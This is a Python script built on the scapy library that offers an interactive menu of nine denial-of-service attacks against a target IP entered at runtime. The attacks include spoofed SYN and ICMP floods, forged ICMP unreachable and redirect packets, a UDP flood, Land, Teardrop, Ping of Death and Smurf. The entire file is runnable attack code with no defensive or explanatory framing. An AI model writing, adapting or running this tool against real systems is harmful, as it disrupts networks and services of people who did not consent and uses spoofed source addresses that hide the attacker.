from scapy.all import *

Run = True

target = input("Target IP: ")
source = input("Source IP: ")
spoofed_IP = input("Fake IP: ")

while Run:
    print('What DOS Attack would you like to send?')
    print('0: SYN Flood\n1: ICMP Flood\n2: Drop Communication\n3: ICMP Redirect \n4: UDP Flood\n5: Land Attack\n6: Teardrop Attack\n7: Ping of Death\n8: Smurf\nq: Exit')

    input_value = input('Enter command:')

    if input_value == '0':
        print("SYN Flood(Spoofed Ip)\n")
        packet = IP(src=spoofed_IP,dst=target) / TCP(dport=139, flags="S")
        send(packet, count=100, inter=0.005)  

    if input_value == '1':
        print("ICMP FLood (Spoofed IP)\n")
        packet = IP(src=spoofed_IP, dst=target) / ICMP() / "1234567890"
        send(packet, count=100, inter=0.005)  
    
    if input_value == '2':
        print("Drop Communication\n")
        dropIp = input("IP Com to drop: ")
        packet1 = IP(dst=target, src=dropIp) / ICMP(type=3, code=1)
        packet2 = IP(dst=dropIp, src=target) / ICMP(type=3, code=1)
        send(packet1)
        send(packet2) 

    if input_value == '3':
        print("ICMP Redirect\n")
        packet = IP(dst=target) / ICMP(type=5, code=1, gw=source)
        send(packet)

    if input_value == '4':
        print("UDP Flood\n")
        packet = IP(dst=target) / UDP(dport=20) / ("X" * RandByte())
        send(packet, count=100)  
    
    if input_value == '5':
        print("Land Attack\n")
        packet = IP(dst=target, src=target) / TCP(sport=139, dport=139, flags="S")
        send(packet) 
    
    if input_value == '6':
        print("Teardrop Attack\n")
        packet1 = IP(dst=target, flags="MF", id=12) / UDP() / ("X" *100)
        packet2 = IP(dst=target, id=12, frag=2) / UDP() / ("X" * 2)
        send(packet1)
        send(packet2) 

    if input_value == '7':
        print("Ping of Death\n")
        packet = IP(dst=target) / ICMP() / ("X" * 66000)
        send(packet)

    if input_value == '8':
        print("Smurf\n")
        a = sniff()
        subnet = input("Subnet Broadcast: ")
        packet = IP(src=target, dst=subnet) / ICMP(type = 8) / "1234567890"
        send(packet, count= 100, inter=0.010)   
        a.summary()
    if input_value == 'q':
        Run = False
